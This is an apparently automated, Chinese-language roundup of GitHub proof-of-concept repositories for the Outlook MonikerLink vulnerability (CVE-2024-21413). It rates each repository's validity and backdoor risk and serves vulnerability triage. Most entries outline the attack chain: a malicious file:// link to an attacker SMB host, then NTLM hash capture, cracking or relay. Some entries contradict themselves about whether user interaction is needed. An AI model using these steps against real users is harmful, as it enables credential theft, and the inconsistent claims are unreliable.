**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

